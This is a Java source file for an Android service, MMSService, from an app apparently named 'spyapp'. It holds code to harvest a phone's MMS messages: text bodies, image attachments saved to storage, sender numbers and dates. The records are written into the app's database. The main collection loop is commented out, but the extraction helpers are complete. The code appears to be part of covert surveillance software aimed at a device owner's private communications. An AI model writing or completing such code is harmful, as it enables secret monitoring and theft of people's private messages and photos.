package com.app.spyapp.service;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.MMSModel;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.sql.Date;
import java.text.MessageFormat;
import java.util.ArrayList;


public class MMSService extends IntentService {
    private SpyApp spyApp;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public MMSService() {
        super(MMSService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this, "GET MMS");
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<MMSModel> mmsList = getMMS();
        if (mmsList != null && mmsList.size() > 0) {
            for (int i = 0; i < mmsList.size(); i++) {
                spyApp.getDatabaseHelper().insertMMS(mmsList.get(i));
            }
        }
    }


    private ArrayList<MMSModel> getMMS() {
        ArrayList<MMSModel> mmsList = new ArrayList<>();
//        ContentResolver contentResolver = getContentResolver();
//        final String[] projection = new String[]{"*"};
//        Uri uri = Uri.parse("content://mms-sms/conversations/");
//        Cursor query = null;
//        if (contentResolver != null && uri != null && projection != null){
//            query = contentResolver.query(uri, projection, null, null, null);
//        }
//
//        if (query != null && query.moveToFirst()) {
//            do {
//                String string = query.getString(query.getColumnIndex("ct_t"));
//                if ("application/vnd.wap.multipart.related".equals(string)) {
//                    // it's MMS
//                    MMSModel mmsModel = new MMSModel();
//
//                    String msgId = query.getString(query.getColumnIndex("_id"));
//                    String content = getMMSTextContent(msgId);
//                    String imagePath = getImagepathFromMMS(msgId);
//                    String address = getAddressNumber(msgId);
//                    String datemilies = query.getString(query.getColumnIndex("date"));
//                    int msgtype = query.getInt(query.getColumnIndex("type"));
//                    Date date = new Date(Long.valueOf(datemilies));
//                    mmsModel.setMsgId(msgId);
//                    mmsModel.setMsgTextContent(content);
//                    mmsModel.setMsgImagePath(imagePath);
//                    mmsModel.setAddress(address);
//                    if (msgtype == Const.TYPE_SENT_INT) {
//                        mmsModel.setType(Const.TYPE_SENT_STRING);
//                    } else {
//                        mmsModel.setType(Const.TYPE_RECEIVE_STRING);
//                    }
//                    mmsModel.setDate(Utils.convertMilisToDate(date.getTime()));
//                    mmsList.add(mmsModel);
//                }
//            } while (query.moveToNext());
//        }
        return mmsList;
    }


    /**
     * get MMS TextContent
     *
     * @param mmsId
     */
    private String getMMSTextContent(String mmsId) {
        String selectionPart = "mid=" + mmsId;
        Uri uri = Uri.parse("content://mms/part");
        Cursor cursor = getContentResolver().query(uri, null,
                selectionPart, null, null);


        if (cursor.moveToFirst()) {
            String body = "";
            do {
                String partId = cursor.getString(cursor.getColumnIndex("_id"));
                String type = cursor.getString(cursor.getColumnIndex("ct"));
                if ("text/plain".equals(type)) {
                    String data = cursor.getString(cursor.getColumnIndex("_data"));

                    if (data != null) {
                        // implementation of this method below
                        body = getMmsText(partId);
                    } else {
                        body = cursor.getString(cursor.getColumnIndex("text"));
                    }
                }

            } while (cursor.moveToNext());
            return body;
        }
        return null;
    }


    /**
     * getMMS text
     *
     * @param id
     * @return
     */
    private String getMmsText(String id) {
        Uri partURI = Uri.parse("content://mms/part/" + id);
        InputStream is = null;
        StringBuilder sb = new StringBuilder();
        try {
            is = getContentResolver().openInputStream(partURI);
            if (is != null) {
                InputStreamReader isr = new InputStreamReader(is, "UTF-8");
                BufferedReader reader = new BufferedReader(isr);
                String temp = reader.readLine();
                while (temp != null) {
                    sb.append(temp);
                    temp = reader.readLine();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                }
            }
        }
        return sb.toString();
    }

    /**
     * How to get image from MMS
     *
     * @param mmsId
     */
    private String getImagepathFromMMS(String mmsId) {
        String selectionPart = "mid=" + mmsId;
        Uri uri = Uri.parse("content://mms/part");
        Cursor cPart = getContentResolver().query(uri, null,
                selectionPart, null, null);
        String path = "";
        if (cPart.moveToFirst()) {
            do {
                String partId = cPart.getString(cPart.getColumnIndex("_id"));
                String type = cPart.getString(cPart.getColumnIndex("ct"));
                if ("image/jpeg".equals(type) || "image/bmp".equals(type) ||
                        "image/gif".equals(type) || "image/jpg".equals(type) ||
                        "image/png".equals(type)) {
                    path = getMmsImagePath(partId);
                }
            } while (cPart.moveToNext());
        }

        return path;

    }


    private String getMmsImagePath(String _id) {
        Uri partURI = Uri.parse("content://mms/part/" + _id);
        InputStream is = null;
        Bitmap bitmap = null;
        String imagePath = null;
        try {
            is = getContentResolver().openInputStream(partURI);
            bitmap = BitmapFactory.decodeStream(is);
            if (bitmap != null) {
                imagePath = Utils.storeImage(bitmap);
            }

        } catch (IOException e) {
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                }
            }
        }
        return imagePath;
    }


    /**
     * How to get the sender address
     *
     * @param id
     * @return
     */
    private String getAddressNumber(String id) {
        String selectionAdd = new String("msg_id=" + id);
        String uriStr = MessageFormat.format("content://mms/{0}/addr", id);
        Uri uriAddress = Uri.parse(uriStr);
        Cursor cAdd = getContentResolver().query(uriAddress, null,
                selectionAdd, null, null);
        String name = null;
        if (cAdd.moveToFirst()) {
            do {
                String number = cAdd.getString(cAdd.getColumnIndex("address"));
                if (number != null) {
                    try {
                        Long.parseLong(number.replace("-", ""));
                        name = number;
                    } catch (NumberFormatException nfe) {
                        if (name == null) {
                            name = number;
                        }
                    }
                }
            } while (cAdd.moveToNext());
        }
        if (cAdd != null) {
            cAdd.close();
        }
        return name;
    }
}
